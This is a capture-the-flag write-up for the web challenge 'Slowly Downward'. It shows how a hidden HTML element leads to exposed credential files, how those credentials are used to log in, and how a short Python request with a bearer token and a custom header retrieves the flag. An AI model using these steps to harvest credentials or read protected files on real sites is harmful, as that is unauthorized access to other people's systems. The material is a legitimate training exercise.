# Slowly Downward

## Description
```
We've found what appears to be a schizophrenic alien's personal blog. Poke around and see if you can find anything interesting.

http://slow.martiansonly.net
```

## Writeup

Starting off, we can look at the `html` of the website. <br/>
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>N O T I T L E</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <div class="container">
        <h2>Small Thoughts:</h1>
        <nav class="thoughts">
            <ul>
                <li><a href="A_MAN_WHO_THINKS_HE_IS_A_PIG.html">A MAN WHO THINKS HE IS A PIG</a></li>
                <li><a href="A_QUIET_AFTERNOON.html">A QUIET AFTERNOON</a></li>
                <li><a href="A_WET_NIGHT.html">A WET NIGHT</a></li>
                <li><a href="ACTING_WITH_CERTAINTY.html">ACTING WITH CERTAINTY</a></li>
                <li><a href="AIRBORNE.html">AIRBORNE</a></li>
                <li><a href="ALIENS_AGAIN.html">ALIENS AGAIN</a></li>
                <li><a href="AN_ACCIDENT_INVOLVING_TRELLIS.html">AN ACCIDENT INVOLVING TRELLIS</a></li>
                <li><a href="ART.html">ART</a></li>
                <li><a href="BIG_BIRD.html">BIG BIRD</a></li>
                <li><a href="BOND_JAMES_BOND.html">BOND JAMES BOND</a></li>
                <li><a href="DOWN_IN_THE_TUBE_STATION.html">DOWN IN THE TUBE STATION</a></li>
                <li><a href="DRACULA.html">DRACULA</a></li>
                <li><a href="HAPPY_STORY.html">HAPPY STORY</a></li>
                <li><a href="HAUNTED.html">HAUNTED</a></li>
                <li><a href="LOVE_STORY.html">LOVE STORY</a></li>
                <li><a href="MACHINE.html">MACHINE</a></li>
                <li><a href="MUSEUM.html">MUSEUM</a></li>
                <li><a href="NEARLY_GOT.html">NEARLY GOT</a></li>
                <li class="hidden-link"><a href="ON_SUNDAYS_RINGROAD_SUPERMARKET.html">ON SUNDAYS RINGROAD SUPERMARKET</a></li>
                <li class="hidden-link"><a href="SHEARS.html">SHEARS</a></li>
                <li class="hidden-link"><a href="SHOPPING_IN_THE_EARLY_MORNING.html">SHOPPING IN THE EARLY MORNING</a></li>
                <li class="hidden-link"><a href="SPACE.html">SPACE</a></li>
                <li class="hidden-link"><a href="STATUE.html">STATUE</a></li>
                <li class="hidden-link"><a href="ADMIN.html">ADMIN</a></li>
            </ul>
        </nav>
        <h2>There are some more, if you like.</h1>
        <nav>
            <ul>
                <li><a class="goBack" href="/">BACK TO THE CONTENTS PAGE</a></li>
            </ul>
        </nav>
    </div>

    <div style="display: none;">
        <div id="A_MAN_WHO_THINKS_HE_IS_A_PIG">ANTIBIOTICS</div>
        <div id="A_QUIET_AFTERNOON">NO SURPRISES</div>
        <div id="A_WET_NIGHT">COLD</div>
        <div id="ACTING_WITH_CERTAINTY">IF WE GET THE CHANCE</div>
        <div id="AIRBORNE">PLANE</div>
        <div id="ALIENS_AGAIN">THEY'RE TRYING TO LOG IN</div>
        <div id="AN_ACCIDENT_INVOLVING_TRELLIS">PLANET</div>
        <div id="ART">HILLS</div>
        <div id="BIG_BIRD">MEMORY</div>
        <div id="BOND_JAMES_BOND">SOMETIMES I FORGET CURL. I NEVER TRUSTED DANIEL STENBERG.</div>
        <div id="DOWN_IN_THE_TUBE_STATION">TRAIN</div>
        <div id="DRACULA">FLOW</div>
        <div id="HAPPY_STORY">MEMORY</div>
        <div id="HAUNTED">ABYSS</div>
        <div id="LOVE_STORY">MEMORY</div>
        <div id="MACHINE">FUTURE</div>
        <div id="MUSEUM">SPIRAL</div>
        <div id="NEARLY_GOT">FINGERS</div>
        <div id="ON_SUNDAYS_RINGROAD_SUPERMARKET">TREES</div>
        <div id="SHEARS">THIS IS IT</div>
        <div id="SHOPPING_IN_THE_EARLY_MORNING">WARM</div>
        <div id="SPACE">HEROES</div>
        <div id="STATUE">EYES</div>
        <div id="ADMIN">username@text/credentials/user.txt password@text/credentials/pass.txt</div>
    </div>
    
    <script>
        document.querySelectorAll('.thoughts a').forEach(link => {
            link.addEventListener('click', function(event) {
                event.preventDefault();
                const targetId = this.getAttribute('href').replace('.html', '');
                const content = document.getElementById(targetId).innerHTML;
                alert(content);
            });
        });
    </script>
</body>
</html>
```

Looking through the webpage we can find a `username` and `password` file. <br/> <br/>
`username` file location: <br/>
```
http://srv3.martiansonly.net:4444/text/credentials/user.txt
```
Content: `4dm1n`. <br/> <br/>


`password` file location: <br/>
```
http://srv3.martiansonly.net:4444/text/credentials/pass.txt
```
Content: `p4ssw0rd1sb0dy5n4tch3r5`. <br/> <br/>

Using these credentials we can login on the webpage `http://srv3.martiansonly.net:4444/abit.html`. <br/>
Trying to read the flag from `http://srv3.martiansonly.net:4444/text/secret/flag.txt` still returns insufficient permissions. <br/>
We can switch to python to send a proper request. <br/>
```py
import requests

baseURL = 'http://srv3.martiansonly.net:4444/'

sessionToken = '1e6ec9f9c268cd2d7bbc197e3bcc8a5c' # Extracted after manual login

headers = {
    'Authorization': f'Bearer {sessionToken}',
    'Secret': 'mynameisstanley', # Extracted after manual login
}

res = requests.get(f'{baseURL}text/secret/flag.txt', headers=headers) # URL extracted from sourcecode of /abit.html webpage

print(res.text)
```

Executing this returns the flag which concludes this writeup. <br/>
```sh
$ python3 .\req.py
shctf{sh0w_m3_th3_w0r1d_a5_id_lov3_t0_s33_1t}
```